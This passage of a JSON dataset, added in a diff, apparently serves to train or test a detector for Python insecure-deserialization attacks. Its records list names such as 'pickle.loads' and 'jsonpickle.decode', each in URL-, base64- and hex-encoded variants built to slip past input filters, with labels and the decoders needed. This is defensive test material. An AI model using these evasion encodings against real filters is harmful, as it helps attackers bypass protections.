+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ea7d69ff33a6ba04a6fc99bb00c8359e791f1932a61ec47c74bf170ab344e8b0",
+    "original_id": "raw_deser_00031",
+    "original_payload": "print(base64.b64encode(pickled).decode())",
+    "obfuscated_payload": "print%2528base64.b64encode%2528pickled%2529.decode%2528%2529%2529",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 50765662,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00032__obf01",
+    "payload": "c%50%69ckle.loads",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00032",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a4c5daf5f23f615a4075366afa30600a3dce2dd2cb58fa5f38a89a676590cf5c",
+    "original_id": "raw_deser_00032",
+    "original_payload": "cPickle.loads",
+    "obfuscated_payload": "c%50%69ckle.loads",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 50862638,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00032__obf02",
+    "payload": "Y1BpY2tsZS5sb2Fkcw==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00032",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a4c5daf5f23f615a4075366afa30600a3dce2dd2cb58fa5f38a89a676590cf5c",
+    "original_id": "raw_deser_00032",
+    "original_payload": "cPickle.loads",
+    "obfuscated_payload": "Y1BpY2tsZS5sb2Fkcw==",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 50863647,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00032__obf03",
+    "payload": "635069636b6c652e6c6f616473",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00032",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a4c5daf5f23f615a4075366afa30600a3dce2dd2cb58fa5f38a89a676590cf5c",
+    "original_id": "raw_deser_00032",
+    "original_payload": "cPickle.loads",
+    "obfuscated_payload": "635069636b6c652e6c6f616473",
+    "obfuscation_chain": [
+      "hex_bytes"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "hex_decode"
+    ],
+    "generation_seed": 50864656,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00032__obf04",
+    "payload": "%63Pickle.loads",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00032",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a4c5daf5f23f615a4075366afa30600a3dce2dd2cb58fa5f38a89a676590cf5c",
+    "original_id": "raw_deser_00032",
+    "original_payload": "cPickle.loads",
+    "obfuscated_payload": "%63Pickle.loads",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 50865665,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00033__obf01",
+    "payload": "pi%63%6Ble.%6Coads",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00033",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "2eb5dd7db7a302507909fb4e1bd62c73616baba940f674f778946daaebd5c0f9",
+    "original_id": "raw_deser_00033",
+    "original_payload": "pickle.loads",
+    "obfuscated_payload": "pi%63%6Ble.%6Coads",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 50962641,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00033__obf02",
+    "payload": "cGlja2xlLmxvYWRz",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00033",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "2eb5dd7db7a302507909fb4e1bd62c73616baba940f674f778946daaebd5c0f9",
+    "original_id": "raw_deser_00033",
+    "original_payload": "pickle.loads",
+    "obfuscated_payload": "cGlja2xlLmxvYWRz",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 50963650,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00033__obf03",
+    "payload": "7069636b6c652e6c6f616473",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00033",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "2eb5dd7db7a302507909fb4e1bd62c73616baba940f674f778946daaebd5c0f9",
+    "original_id": "raw_deser_00033",
+    "original_payload": "pickle.loads",
+    "obfuscated_payload": "7069636b6c652e6c6f616473",
+    "obfuscation_chain": [
+      "hex_bytes"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "hex_decode"
+    ],
+    "generation_seed": 50964659,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00033__obf04",
+    "payload": "Y0dsamEyeGxMbXh2WVdSeg==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00033",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "2eb5dd7db7a302507909fb4e1bd62c73616baba940f674f778946daaebd5c0f9",
+    "original_id": "raw_deser_00033",
+    "original_payload": "pickle.loads",
+    "obfuscated_payload": "Y0dsamEyeGxMbXh2WVdSeg==",
+    "obfuscation_chain": [
+      "base64_standard",
+      "base64_standard"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid_fallback",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 50965668,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00034__obf01",
+    "payload": "%5Fpick%6Ce.load%73",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00034",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c4ed2b51c7d27fb171a32bc1417da4eefddeca18ad393eaec22d34c7734d2b3f",
+    "original_id": "raw_deser_00034",
+    "original_payload": "_pickle.loads",
+    "obfuscated_payload": "%5Fpick%6Ce.load%73",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 51062644,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00034__obf02",
+    "payload": "X3BpY2tsZS5sb2Fkcw",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00034",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c4ed2b51c7d27fb171a32bc1417da4eefddeca18ad393eaec22d34c7734d2b3f",
+    "original_id": "raw_deser_00034",
+    "original_payload": "_pickle.loads",
+    "obfuscated_payload": "X3BpY2tsZS5sb2Fkcw",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 51063653,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00034__obf03",
+    "payload": "5f7069636b6c652e6c6f616473",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00034",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c4ed2b51c7d27fb171a32bc1417da4eefddeca18ad393eaec22d34c7734d2b3f",
+    "original_id": "raw_deser_00034",
+    "original_payload": "_pickle.loads",
+    "obfuscated_payload": "5f7069636b6c652e6c6f616473",
+    "obfuscation_chain": [
+      "hex_bytes"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "hex_decode"
+    ],
+    "generation_seed": 51064662,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00034__obf04",
+    "payload": "_%70ickl%65%2Eloa%64s",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00034",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c4ed2b51c7d27fb171a32bc1417da4eefddeca18ad393eaec22d34c7734d2b3f",
+    "original_id": "raw_deser_00034",
+    "original_payload": "_pickle.loads",
+    "obfuscated_payload": "_%70ickl%65%2Eloa%64s",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 51065671,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00035__obf01",
+    "payload": "%6Asonp%69ck%6Ce%2Edecode",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00035",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "fd69151d9a4d2ca3357cbeb1ec69fb5aef2c04a922871218f89f7b397676ef57",
+    "original_id": "raw_deser_00035",
+    "original_payload": "jsonpickle.decode",
+    "obfuscated_payload": "%6Asonp%69ck%6Ce%2Edecode",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 51162647,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00035__obf02",
+    "payload": "anNvbnBpY2tsZS5kZWNvZGU=",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00035",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "fd69151d9a4d2ca3357cbeb1ec69fb5aef2c04a922871218f89f7b397676ef57",
+    "original_id": "raw_deser_00035",
+    "original_payload": "jsonpickle.decode",
+    "obfuscated_payload": "anNvbnBpY2tsZS5kZWNvZGU=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 51163656,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00035__obf03",
+    "payload": "6a736f6e7069636b6c652e6465636f6465",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00035",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "fd69151d9a4d2ca3357cbeb1ec69fb5aef2c04a922871218f89f7b397676ef57",
+    "original_id": "raw_deser_00035",
+    "original_payload": "jsonpickle.decode",
+    "obfuscated_payload": "6a736f6e7069636b6c652e6465636f6465",
+    "obfuscation_chain": [
+      "hex_bytes"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "hex_decode"
+    ],
+    "generation_seed": 51164665,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00035__obf04",
+    "payload": "anNvbnBpY2tsZS5kZWNvZGU",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00035",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "fd69151d9a4d2ca3357cbeb1ec69fb5aef2c04a922871218f89f7b397676ef57",
+    "original_id": "raw_deser_00035",
+    "original_payload": "jsonpickle.decode",
+    "obfuscated_payload": "anNvbnBpY2tsZS5kZWNvZGU",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 51165674,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00036__obf01",
+    "payload": "%63Pickle",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00036",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "410d46970fad9cc60efbf6270b9eec426be9c0377589da56474617b3afa38902",
+    "original_id": "raw_deser_00036",
+    "original_payload": "cPickle",
+    "obfuscated_payload": "%63Pickle",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 51262650,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00036__obf02",
+    "payload": "Y1BpY2tsZQ==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00036",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "410d46970fad9cc60efbf6270b9eec426be9c0377589da56474617b3afa38902",
+    "original_id": "raw_deser_00036",
+    "original_payload": "cPickle",
+    "obfuscated_payload": "Y1BpY2tsZQ==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 51263659,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00036__obf03",
+    "payload": "635069636b6c65",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00036",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "410d46970fad9cc60efbf6270b9eec426be9c0377589da56474617b3afa38902",
+    "original_id": "raw_deser_00036",
+    "original_payload": "cPickle",
+    "obfuscated_payload": "635069636b6c65",
+    "obfuscation_chain": [
+      "hex_bytes"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "hex_decode"
+    ],
+    "generation_seed": 51264668,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00036__obf04",
+    "payload": "Y1BpY2tsZQ",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00036",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "410d46970fad9cc60efbf6270b9eec426be9c0377589da56474617b3afa38902",
+    "original_id": "raw_deser_00036",
+    "original_payload": "cPickle",
+    "obfuscated_payload": "Y1BpY2tsZQ",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 51265677,
+    "equivalence_scope": "explicit-decoder-required"
+  }
+]
